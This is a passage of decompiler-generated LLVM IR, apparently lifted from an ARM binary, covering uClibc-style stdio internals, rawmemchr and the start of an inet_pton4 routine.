  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15528 = load i32, i32* @r4, align 4
  store i32 %v3_15528, i32* %stack_var_-12, align 4
  %v3_1552c = load i16, i16* %arg1, align 2
  %v4_1552c = zext i16 %v3_1552c to i32
  store i32 %v4_1552c, i32* @ip, align 4
  %tmp16 = urem i16 %v3_1552c, 4
  %v1_15530 = zext i16 %tmp16 to i32
  store i32 %v1_15530, i32* %r2.global-to-local, align 4
  %v2_15530 = icmp eq i16 %tmp16, 0
  br i1 %v2_15530, label %bb, label %dec_label_pc_15540

bb:                                               ; preds = %entry
  br label %bb13

dec_label_pc_15540:                               ; preds = %entry
  %v1_15540 = add nsw i32 %v1_15530, -1
  %v7_15540 = icmp eq i16 %tmp16, 1
  br i1 %v7_15540, label %bb13, label %dec_label_pc_15548

dec_label_pc_15548:                               ; preds = %dec_label_pc_15540
  %v1_15548 = and i32 %v4_1552c, 2048
  %v2_15548 = icmp eq i32 %v1_15548, 0
  br i1 %v2_15548, label %bb13, label %dec_label_pc_15550

dec_label_pc_15550:                               ; preds = %dec_label_pc_15548
  %v7_15550 = icmp eq i32 %v1_15540, 2
  br i1 %v7_15550, label %dec_label_pc_155dc, label %dec_label_pc_15558

dec_label_pc_15558:                               ; preds = %dec_label_pc_15550
  %v2_15558 = add i32 %tmp, 40
  %v3_15558 = inttoptr i32 %v2_15558 to i32*
  %v4_15558 = load i32, i32* %v3_15558, align 4
  store i32 %v4_15558, i32* %r3.global-to-local, align 4
  %v2_1555c = icmp eq i32 %v4_15558, 0
  br i1 %v2_1555c, label %dec_label_pc_15564, label %dec_label_pc_155dc

dec_label_pc_15564:                               ; preds = %dec_label_pc_15558
  %v2_15564 = add i32 %tmp, 44
  %v3_15564 = inttoptr i32 %v2_15564 to i32*
  %v4_15564 = load i32, i32* %v3_15564, align 4
  store i32 %v4_15564, i32* %r3.global-to-local, align 4
  %v2_15568 = add i32 %tmp, 3
  %v3_15568 = inttoptr i32 %v2_15568 to i8*
  %v4_15568 = load i8, i8* %v3_15568, align 1
  %v5_15568 = zext i8 %v4_15568 to i32
  store i32 %v5_15568, i32* %r2.global-to-local, align 4
  %v2_1556c = icmp eq i32 %v4_15564, 0
  br i1 %v2_1556c, label %.thread1, label %bb12

.thread1:                                         ; preds = %dec_label_pc_15564
  %v1_155743 = sub nsw i32 0, %v5_15568
  br label %bb13

bb12:                                             ; preds = %dec_label_pc_15564
  %v3_15570 = add i32 %tmp, 2
  %v4_15570 = inttoptr i32 %v3_15570 to i8*
  %v5_15570 = load i8, i8* %v4_15570, align 1
  %v6_15570 = zext i8 %v5_15570 to i32
  store i32 %v6_15570, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_15570, %v5_15568
  %v3_15578 = sub nsw i32 0, %sum
  br label %bb13

bb13:                                             ; preds = %bb, %.thread1, %dec_label_pc_15548, %dec_label_pc_15540, %bb12
  %v1_1558c = phi i32 [ %v1_155743, %.thread1 ], [ %v1_15540, %dec_label_pc_15548 ], [ %v1_15540, %dec_label_pc_15540 ], [ 0, %bb ], [ %v3_15578, %bb12 ]
  %v1_1557c = and i32 %v4_1552c, 64
  %v2_1557c = icmp eq i32 %v1_1557c, 0
  %v2_15580 = add i32 %tmp, 16
  %v3_15580 = inttoptr i32 %v2_15580 to i32*
  %v4_15580 = load i32, i32* %v3_15580, align 4
  store i32 %v4_15580, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_1557c, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_1558c = sub i32 %v1_1558c, %v4_15580
  store i32 %v2_1558c, i32* %r3.global-to-local, align 4
  %v1_15590 = inttoptr i32 %arg2 to i32*
  %v2_15590 = load i32, i32* %v1_15590, align 4
  store i32 %v2_15590, i32* %r0.global-to-local, align 4
  %v3_15590 = add i32 %arg2, 4
  %v4_15590 = inttoptr i32 %v3_15590 to i32*
  %v5_15590 = load i32, i32* %v4_15590, align 4
  %v2_15594 = add i32 %storemerge, %v2_1558c
  store i32 %v2_15594, i32* %r4.global-to-local, align 4
  %v2_15598 = sub i32 %v2_15590, %v2_15594
  store i32 %v2_15598, i32* %r2.global-to-local, align 4
  %v2_1559c = and i32 %v2_15594, 1073741824
  %v3_1559c = icmp ne i32 %v2_1559c, 0
  %v4_1559c = ashr i32 %v2_15594, 31
  %v6_1559c = icmp eq i1 %v3_1559c, false
  %v7_1559c = sub i32 %v5_15590, %v4_1559c
  %v9_1559c = sext i1 %v6_1559c to i32
  %v10_1559c = add i32 %v7_1559c, %v9_1559c
  store i32 %v10_1559c, i32* %r3.global-to-local, align 4
  %v2_155a0 = sub i32 %v10_1559c, %v5_15590
  %v4_155a0 = xor i32 %v10_1559c, %v5_15590
  %v5_155a0 = xor i32 %v2_155a0, %v10_1559c
  %v6_155a0 = and i32 %v5_155a0, %v4_155a0
  %v7_155a0 = icmp slt i32 %v6_155a0, 0
  %v8_155a0 = icmp slt i32 %v2_155a0, 0
  %v9_155a0 = icmp eq i32 %v10_1559c, %v5_15590
  store i32 %v2_15598, i32* %v1_15590, align 4
  %v5_155a4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_155a4, i32* %v4_15590, align 4
  %v3_155a8 = xor i1 %v8_155a0, %v7_155a0
  %v4_155a8 = or i1 %v9_155a0, %v3_155a8
  br i1 %v4_155a8, label %dec_label_pc_155ac, label %dec_label_pc_155b8

dec_label_pc_155ac:                               ; preds = %bb13
  br i1 %v9_155a0, label %dec_label_pc_155b0, label %dec_label_pc_155bcthread-pre-split

dec_label_pc_155b0:                               ; preds = %dec_label_pc_155ac
  %v0_155b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_155b0 = load i32, i32* %r0.global-to-local, align 4
  %tmp17 = icmp ugt i32 %v0_155b0, %v1_155b0
  br i1 %tmp17, label %dec_label_pc_155b8, label %dec_label_pc_155bcthread-pre-split

dec_label_pc_155b8:                               ; preds = %dec_label_pc_155b0, %bb13
  %v0_155b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_155b8 = sub i32 0, %v0_155b8
  store i32 %v1_155b8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_155bc

dec_label_pc_155bcthread-pre-split:               ; preds = %dec_label_pc_155b0, %dec_label_pc_155ac
  %v0_155bc.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_155bc

dec_label_pc_155bc:                               ; preds = %dec_label_pc_155bcthread-pre-split, %dec_label_pc_155b8
  %v0_155bc = phi i32 [ %v0_155bc.pr, %dec_label_pc_155bcthread-pre-split ], [ %v1_155b8, %dec_label_pc_155b8 ]
  %v1_155bc = icmp slt i32 %v0_155bc, 0
  br i1 %v1_155bc, label %dec_label_pc_155c4, label %dec_label_pc_155e0

dec_label_pc_155c4:                               ; preds = %dec_label_pc_155bc
  store i32 60060, i32* %r3.global-to-local, align 4
  %v0_155c8 = call i32 @__aeabi_read_tp()
  store i32 %v0_155c8, i32* %r0.global-to-local, align 4
  %v3_155cc = load i16, i16* @global_var_24070.401, align 2
  %v4_155cc = sext i16 %v3_155cc to i32
  store i32 %v4_155cc, i32* %r3.global-to-local, align 4
  store i32 75, i32* %r2.global-to-local, align 4
  %v3_155d4 = add i32 %v4_155cc, %v0_155c8
  %v4_155d4 = inttoptr i32 %v3_155d4 to i32*
  store i32 75, i32* %v4_155d4, align 4
  %v0_155e0.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_155e0

dec_label_pc_155dc:                               ; preds = %dec_label_pc_15558, %dec_label_pc_15550
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_155e0

dec_label_pc_155e0:                               ; preds = %dec_label_pc_155bc, %dec_label_pc_155c4, %dec_label_pc_155dc
  %v0_155e0 = phi i32 [ %v0_155bc, %dec_label_pc_155bc ], [ %v0_155e0.pre, %dec_label_pc_155c4 ], [ -1, %dec_label_pc_155dc ]
  store i32 %v0_155e0, i32* %r0.global-to-local, align 4
  %v2_155e4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_155e4, i32* @r4, align 4
  ret i32 %v0_155e0

; uselistorder directives
  uselistorder i32 %v0_155e0, { 1, 0 }
  uselistorder i1 %v9_155a0, { 1, 0 }
  uselistorder i32 %v2_155a0, { 1, 0 }
  uselistorder i32 %v10_1559c, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_15590, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_155e0, { 2, 1, 0 }
  uselistorder label %bb13, { 4, 1, 2, 3, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_155f0 = load i32, i32* @r4, align 4
  store i32 %v3_155f0, i32* %stack_var_-8, align 4
  %v1_155f4 = add i32 %arg1, 8
  %v1_155f8 = inttoptr i32 %v1_155f4 to i32*
  %v2_155f8 = load i32, i32* %v1_155f8, align 4
  store i32 %v2_155f8, i32* @r1, align 4
  %v3_155f8 = add i32 %arg1, 12
  %v4_155f8 = inttoptr i32 %v3_155f8 to i32*
  %v5_155f8 = load i32, i32* %v4_155f8, align 4
  %v2_155fc = sub i32 %v5_155f8, %v2_155f8
  store i32 %v2_155fc, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_15604 = inttoptr i32 %arg1 to i16*
  %v4_15604 = call i32 @__stdio_READ(i16* %v3_15604, i32 %v2_155f8, i32 %v2_155fc)
  %v0_15608 = load i32, i32* @r4, align 4
  %v1_15608 = add i32 %v0_15608, 8
  %v2_15608 = inttoptr i32 %v1_15608 to i32*
  %v3_15608 = load i32, i32* %v2_15608, align 4
  store i32 %v3_15608, i32* %r2.global-to-local, align 4
  %v2_1560c = add i32 %v3_15608, %v4_15604
  %v2_15610 = add i32 %v0_15608, 20
  %v3_15610 = inttoptr i32 %v2_15610 to i32*
  store i32 %v2_1560c, i32* %v3_15610, align 4
  %v0_15614 = load i32, i32* %r2.global-to-local, align 4
  %v1_15614 = load i32, i32* @r4, align 4
  %v2_15614 = add i32 %v1_15614, 16
  %v3_15614 = inttoptr i32 %v2_15614 to i32*
  store i32 %v0_15614, i32* %v3_15614, align 4
  %v2_15618 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15618, i32* @r4, align 4
  ret i32 %v4_15604

; uselistorder directives
  uselistorder i32 %v4_15604, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_15620 = load i32, i32* @r4, align 4
  store i32 %v3_15620, i32* %stack_var_-12, align 4
  %v0_15624 = load i32, i32* @r0, align 4
  %v1_15624 = inttoptr i32 %v0_15624 to i16*
  %v2_15624 = load i16, i16* %v1_15624, align 2
  %v3_15624 = zext i16 %v2_15624 to i32
  store i32 %v3_15624, i32* %r3.global-to-local, align 4
  %v0_15628 = load i32, i32* @r1, align 4
  %v2_15628 = and i32 %v0_15628, %v3_15624
  %v4_15628 = icmp eq i32 %v2_15628, 0
  store i32 %v0_15624, i32* @r4, align 4
  br i1 %v4_15628, label %dec_label_pc_15638, label %dec_label_pc_15648

dec_label_pc_15638:                               ; preds = %entry
  %v1_15638 = and i32 %v3_15624, 2176
  %v2_15638 = icmp eq i32 %v1_15638, 0
  br i1 %v2_15638, label %dec_label_pc_15640, label %dec_label_pc_15654

dec_label_pc_15640:                               ; preds = %dec_label_pc_15638
  %v2_15640 = or i32 %v0_15628, %v3_15624
  store i32 %v2_15640, i32* %r3.global-to-local, align 4
  %v1_15644 = trunc i32 %v2_15640 to i16
  store i16 %v1_15644, i16* %v1_15624, align 2
  %v0_15648.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15648

dec_label_pc_15648:                               ; preds = %entry, %dec_label_pc_15640
  %v0_15648 = phi i32 [ %v0_15624, %entry ], [ %v0_15648.pre, %dec_label_pc_15640 ]
  %v1_15648 = inttoptr i32 %v0_15648 to i16*
  %v2_15648 = load i16, i16* %v1_15648, align 2
  %v3_15648 = zext i16 %v2_15648 to i32
  store i32 %v3_15648, i32* %r3.global-to-local, align 4
  %v1_1564c = and i32 %v3_15648, 16
  store i32 %v1_1564c, i32* %r5.global-to-local, align 4
  %v2_1564c = icmp eq i32 %v1_1564c, 0
  br i1 %v2_1564c, label %dec_label_pc_1567c, label %dec_label_pc_15654

dec_label_pc_15654:                               ; preds = %dec_label_pc_15638, %dec_label_pc_15648
  store i32 59916, i32* %r3.global-to-local, align 4
  %v0_15658 = call i32 @__aeabi_read_tp()
  store i32 %v0_15658, i32* %r0.global-to-local, align 4
  %v3_1565c = load i16, i16* @global_var_24070.401, align 2
  %v4_1565c = sext i16 %v3_1565c to i32
  store i32 %v4_1565c, i32* %r3.global-to-local, align 4
  %v3_15664 = add i32 %v4_1565c, %v0_15658
  %v4_15664 = inttoptr i32 %v3_15664 to i32*
  store i32 9, i32* %v4_15664, align 4
  br label %dec_label_pc_15668

dec_label_pc_15668:                               ; preds = %dec_label_pc_15684, %dec_label_pc_15654
  %v0_15668 = load i32, i32* @r4, align 4
  %v1_15668 = inttoptr i32 %v0_15668 to i16*
  %v2_15668 = load i16, i16* %v1_15668, align 2
  %v3_15668 = zext i16 %v2_15668 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_15670 = or i32 %v3_15668, 8
  store i32 %v1_15670, i32* %r3.global-to-local, align 4
  %v1_15674 = trunc i32 %v1_15670 to i16
  store i16 %v1_15674, i16* %v1_15668, align 2
  %v1_156bc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_156b4

dec_label_pc_1567c:                               ; preds = %dec_label_pc_15648
  %v1_1567c = and i32 %v3_15648, 64
  %v2_1567c = icmp eq i32 %v1_1567c, 0
  br i1 %v2_1567c, label %dec_label_pc_156a4, label %dec_label_pc_15684

dec_label_pc_15684:                               ; preds = %dec_label_pc_1567c
  %v0_15684 = call i32 @__stdio_wcommit()
  store i32 %v0_15684, i32* %r0.global-to-local, align 4
  %v2_15688 = icmp eq i32 %v0_15684, 0
  br i1 %v2_15688, label %dec_label_pc_15690, label %dec_label_pc_15668

dec_label_pc_15690:                               ; preds = %dec_label_pc_15684
  %v0_15690 = load i32, i32* @r4, align 4
  %v1_15690 = inttoptr i32 %v0_15690 to i16*
  %v2_15690 = load i16, i16* %v1_15690, align 2
  %v3_15690 = zext i16 %v2_15690 to i32
  store i32 %v3_15690, i32* %r3.global-to-local, align 4
  %v1_15694 = add i32 %v0_15690, 8
  %v2_15694 = inttoptr i32 %v1_15694 to i32*
  %v3_15694 = load i32, i32* %v2_15694, align 4
  %v1_15698 = and i32 %v3_15690, 65471
  store i32 %v1_15698, i32* %r3.global-to-local, align 4
  %v2_1569c = add i32 %v0_15690, 28
  %v3_1569c = inttoptr i32 %v2_1569c to i32*
  store i32 %v3_15694, i32* %v3_1569c, align 4
  %v0_156a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_156a0 = trunc i32 %v0_156a0 to i16
  %v2_156a0 = load i32, i32* @r4, align 4
  %v3_156a0 = inttoptr i32 %v2_156a0 to i16*
  store i16 %v1_156a0, i16* %v3_156a0, align 2
  %v0_156a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_156a4

dec_label_pc_156a4:                               ; preds = %dec_label_pc_1567c, %dec_label_pc_15690
  %v2_156ac = phi i32 [ %v0_15648, %dec_label_pc_1567c ], [ %v0_156a4.pre, %dec_label_pc_15690 ]
  %v1_156a4 = inttoptr i32 %v2_156ac to i16*
  %v2_156a4 = load i16, i16* %v1_156a4, align 2
  %v3_156a4 = zext i16 %v2_156a4 to i32
  %v1_156a8 = or i32 %v3_156a4, 1
  store i32 %v1_156a8, i32* %r3.global-to-local, align 4
  %v1_156ac = trunc i32 %v1_156a8 to i16
  store i16 %v1_156ac, i16* %v1_156a4, align 2
  %v0_156b0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_156b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_156b4

dec_label_pc_156b4:                               ; preds = %dec_label_pc_15668, %dec_label_pc_156a4
  %v1_156bc = phi i32 [ %v1_156bc.pre, %dec_label_pc_15668 ], [ %v0_156b0, %dec_label_pc_156a4 ]
  %v2_156b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_156b8, i32* @r4, align 4
  ret i32 %v1_156bc

; uselistorder directives
  uselistorder i32 %v3_15624, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 5, 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_156b4, { 1, 0 }
  uselistorder label %dec_label_pc_156a4, { 1, 0 }
  uselistorder label %dec_label_pc_15654, { 1, 0 }
  uselistorder label %dec_label_pc_15648, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_156d0 = load i32, i32* %arg2, align 4
  %v3_156d0 = add i32 %tmp, 4
  %v4_156d0 = inttoptr i32 %v3_156d0 to i32*
  %v5_156d0 = load i32, i32* %v4_156d0, align 4
  %v1_156d4 = add i32 %arg1, 4
  %v2_156d4 = inttoptr i32 %v1_156d4 to i32*
  %v3_156d4 = load i32, i32* %v2_156d4, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_156dc = call i32 @__GI_lseek64(i32 %v3_156d4, i32 %tmp, i32 %v2_156d0, i32 %v5_156d0)
  %v1_156e0 = icmp slt i32* %arg2, null
  br i1 %v1_156e0, label %bb13, label %bb

bb:                                               ; preds = %entry
  %v3_156e85 = load i32, i32* @r4, align 4
  %v4_156e86 = inttoptr i32 %v3_156e85 to i32*
  store i32 %v4_156dc, i32* %v4_156e86, align 4
  %v6_156e87 = add i32 %v3_156e85, 4
  %v7_156e88 = inttoptr i32 %v6_156e87 to i32*
  store i32 %tmp, i32* %v7_156e88, align 4
  br label %bb13

bb13:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_156dc, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @rawmemchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_15704 = urem i32 %arg1, 256
  %v0_1571c2 = load i32, i32* @r0, align 4
  %v1_1571c3 = urem i32 %v0_1571c2, 4
  %v2_1571c4 = icmp eq i32 %v1_1571c3, 0
  br i1 %v2_1571c4, label %dec_label_pc_15724, label %dec_label_pc_1570c

dec_label_pc_1570c:                               ; preds = %entry, %dec_label_pc_15718
  %v0_15718 = phi i32 [ %v1_15718, %dec_label_pc_15718 ], [ %v0_1571c2, %entry ]
  %v1_1570c = inttoptr i32 %v0_15718 to i8*
  %v2_1570c = load i8, i8* %v1_1570c, align 1
  %v3_1570c = zext i8 %v2_1570c to i32
  %v9_15710 = icmp eq i32 %v3_1570c, %v1_15704
  br i1 %v9_15710, label %dec_label_pc_157a0, label %dec_label_pc_15718

dec_label_pc_15718:                               ; preds = %dec_label_pc_1570c
  %v1_15718 = add i32 %v0_15718, 1
  %v1_1571c = urem i32 %v1_15718, 4
  %v2_1571c = icmp eq i32 %v1_1571c, 0
  br i1 %v2_1571c, label %dec_label_pc_15724, label %dec_label_pc_1570c

dec_label_pc_15724:                               ; preds = %dec_label_pc_15718, %entry
  %v0_15728 = phi i32 [ %v0_1571c2, %entry ], [ %v1_15718, %dec_label_pc_15718 ]
  %v4_15724 = mul nuw nsw i32 %v1_15704, 256
  %v5_15724 = or i32 %v4_15724, %v1_15704
  %v4_1572c = mul i32 %v5_15724, 65536
  %v5_1572c = or i32 %v4_1572c, %v5_15724
  br label %dec_label_pc_15730

dec_label_pc_15730:                               ; preds = %dec_label_pc_15790, %dec_label_pc_15730, %dec_label_pc_15724
  %v0_15774 = phi i32 [ %v0_15728, %dec_label_pc_15724 ], [ %v4_15730, %dec_label_pc_15730 ], [ %v4_15730, %dec_label_pc_15790 ]
  %v1_15730 = inttoptr i32 %v0_15774 to i32*
  %v2_15730 = load i32, i32* %v1_15730, align 4
  %v4_15730 = add i32 %v0_15774, 4
  %v2_15738 = xor i32 %v2_15730, %v5_1572c
  %v2_1573c = add i32 %v2_15738, 2130640639
  %v1_15744 = sub i32 -1, %v2_15738
  %v2_15748 = xor i32 %v2_1573c, %v1_15744
  %v2_1574c = and i32 %v2_15748, -2130640640
  %v2_15750 = icmp eq i32 %v2_1574c, 0
  br i1 %v2_15750, label %dec_label_pc_15730, label %dec_label_pc_15758

dec_label_pc_15758:                               ; preds = %dec_label_pc_15730
  %v2_15758 = inttoptr i32 %v0_15774 to i8*
  %v3_15758 = load i8, i8* %v2_15758, align 1
  %v4_15758 = zext i8 %v3_15758 to i32
  %v9_15760 = icmp eq i32 %v4_15758, %v1_15704
  %v1_15764 = add i32 %v0_15774, 3
  br i1 %v9_15760, label %dec_label_pc_157a0, label %dec_label_pc_1576c

dec_label_pc_1576c:                               ; preds = %dec_label_pc_15758
  %v1_1576c = add i32 %v0_15774, 1
  %v2_1576c = inttoptr i32 %v1_1576c to i8*
  %v3_1576c = load i8, i8* %v2_1576c, align 1
  %v4_1576c = zext i8 %v3_1576c to i32
  %v9_15770 = icmp eq i32 %v4_1576c, %v1_15704
  br i1 %v9_15770, label %bb, label %dec_label_pc_15780

bb:                                               ; preds = %dec_label_pc_1576c
  br label %dec_label_pc_157a0

dec_label_pc_15780:                               ; preds = %dec_label_pc_1576c
  %v1_15780 = add i32 %v0_15774, 2
  %v2_15780 = inttoptr i32 %v1_15780 to i8*
  %v3_15780 = load i8, i8* %v2_15780, align 1
  %v4_15780 = zext i8 %v3_15780 to i32
  %v9_15784 = icmp eq i32 %v4_15780, %v1_15704
  br i1 %v9_15784, label %dec_label_pc_157a0, label %dec_label_pc_15790

dec_label_pc_15790:                               ; preds = %dec_label_pc_15780
  %v2_15790 = inttoptr i32 %v1_15764 to i8*
  %v3_15790 = load i8, i8* %v2_15790, align 1
  %v4_15790 = zext i8 %v3_15790 to i32
  %v9_15794 = icmp eq i32 %v4_15790, %v1_15704
  br i1 %v9_15794, label %dec_label_pc_1579c, label %dec_label_pc_15730

dec_label_pc_1579c:                               ; preds = %dec_label_pc_15790
  br label %dec_label_pc_157a0

dec_label_pc_157a0:                               ; preds = %dec_label_pc_1570c, %dec_label_pc_15780, %dec_label_pc_15758, %bb, %dec_label_pc_1579c
  %v1_157a4 = phi i32 [ %v1_15764, %dec_label_pc_1579c ], [ %v1_1576c, %bb ], [ %v1_15780, %dec_label_pc_15780 ], [ %v0_15774, %dec_label_pc_15758 ], [ %v0_15718, %dec_label_pc_1570c ]
  ret i32 %v1_157a4

; uselistorder directives
  uselistorder i32 %v4_15730, { 1, 0 }
  uselistorder i32 %v0_15774, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_15724, { 1, 0 }
  uselistorder i32 %v1_15718, { 1, 0, 2 }
  uselistorder i32 %v0_1571c2, { 2, 1, 0 }
  uselistorder i32 %v1_15704, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 2130640639, { 6, 2, 7, 3, 8, 9, 4, 0, 10, 5, 1 }
  uselistorder label %dec_label_pc_157a0, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_1570c, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_157b0 = load i32, i32* @r4, align 4
  %v6_157b0 = load i32, i32* @r5, align 4
  %v15_157b0 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_157c8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_157c8, i32* @r1, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_158401 = load i32, i32* @r0, align 4
  %v1_158402 = inttoptr i32 %v0_158401 to i8*
  %v2_158403 = load i8, i8* %v1_158402, align 1
  %v3_158404 = zext i8 %v2_158403 to i32
  store i32 %v3_158404, i32* @r3, align 4
  %v2_158445 = icmp eq i8 %v2_158403, 0
  store i1 %v2_158445, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_158445, label %dec_label_pc_15850, label %dec_label_pc_157e0

dec_label_pc_157e0:                               ; preds = %entry, %dec_label_pc_15840.backedge
  %v0_157e4 = phi i32 [ %v0_15840, %dec_label_pc_15840.backedge ], [ %v0_158401, %entry ]
  %v0_1581c = phi i32 [ %v3_15840, %dec_label_pc_15840.backedge ], [ %v3_158404, %entry ]
  %v2_157f0.in = phi i32 [ %v3_15840, %dec_label_pc_15840.backedge ], [ %v3_158404, %entry ]
  %v2_157f0 = add nsw i32 %v2_157f0.in, -48
  %v2_157e0 = icmp ugt i32 %v2_157f0, 8
  %v7_157e0 = icmp eq i32 %v2_157f0, 9
  store i1 %v7_157e0, i1* %cpsr_z.global-to-local, align 1
  %v1_157e4 = add i32 %v0_157e4, 1
  store i32 %v1_157e4, i32* %r0.global-to-local, align 4
  %v2_157e8 = xor i1 %v7_157e0, true
  %v3_157e8 = and i1 %v2_157e0, %v2_157e8
  br i1 %v3_157e8, label %dec_label_pc_1581c, label %dec_label_pc_157ec

dec_label_pc_157ec:                               ; preds = %dec_label_pc_157e0
  %v0_157ec = load i32, i32* @r1, align 4
  %v1_157ec = inttoptr i32 %v0_157ec to i8*
  %v2_157ec = load i8, i8* %v1_157ec, align 1
  %v3_157ec = zext i8 %v2_157ec to i32
  %v0_157f0 = load i32, i32* %r7.global-to-local, align 4
  %v3_157f0 = mul i32 %v0_157f0, %v3_157ec
  %v4_157f0 = add i32 %v3_157f0, %v2_157f0
  store i32 %v4_157f0, i32* @r3, align 4
  %v2_157f4 = icmp ugt i32 %v4_157f0, 254
  %v7_157f4 = icmp eq i32 %v4_157f0, 255
  store i1 %v7_157f4, i1* %cpsr_z.global-to-local, align 1
  %v2_157f8 = xor i1 %v7_157f4, true
  %v3_157f8 = and i1 %v2_157f4, %v2_157f8
  br i1 %v3_157f8, label %dec_label_pc_15874, label %dec_label_pc_157fc

dec_label_pc_157fc:                               ; preds = %dec_label_pc_157ec
  %v0_157fc = load i32, i32* @lr, align 4
  %v2_157fc = icmp eq i32 %v0_157fc, 0
  store i1 %v2_157fc, i1* %cpsr_z.global-to-local, align 1
  %v1_15800 = trunc i32 %v4_157f0 to i8
  store i8 %v1_15800, i8* %v1_157ec, align 1
  %v0_15804 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15804, label %dec_label_pc_15808, label %dec_label_pc_15840.backedge

dec_label_pc_15808:                               ; preds = %dec_label_pc_157fc
  %v0_15808 = load i32, i32* @ip, align 4
  %v1_15808 = add i32 %v0_15808, 1
  store i32 %v1_15808, i32* @ip, align 4
  %v7_1580c = icmp eq i32 %v1_15808, 4
  store i1 %v7_1580c, i1* %cpsr_z.global-to-local, align 1
  %v0_15810 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15810, i32* @lr, align 4
  %v8_15814 = icmp sgt i32 %v1_15808, 4
  br i1 %v8_15814, label %dec_label_pc_15874, label %dec_label_pc_15840.backedge

dec_label_pc_1581c:                               ; preds = %dec_label_pc_157e0
  %v7_1581c = icmp eq i32 %v0_1581c, 46
  %v1_15824 = load i32, i32* @lr, align 4
  %v2_15824 = urem i32 %v1_15824, 2
  %storemerge12 = select i1 %v7_1581c, i32 %v2_15824, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_15828 = icmp eq i32 %storemerge12, 0
  store i1 %v2_15828, i1* %cpsr_z.global-to-local, align 1
  %v0_1582c = load i32, i32* @r5, align 4
  store i32 %v0_1582c, i32* @lr, align 4
  br i1 %v2_15828, label %dec_label_pc_15874, label %dec_label_pc_15834

dec_label_pc_15834:                               ; preds = %dec_label_pc_1581c
  %v0_15834 = load i32, i32* @ip, align 4
  %v7_15834 = icmp eq i32 %v0_15834, 4
  store i1 %v7_15834, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15834, label %dec_label_pc_15874, label %dec_label_pc_1583c

dec_label_pc_1583c:                               ; preds = %dec_label_pc_15834
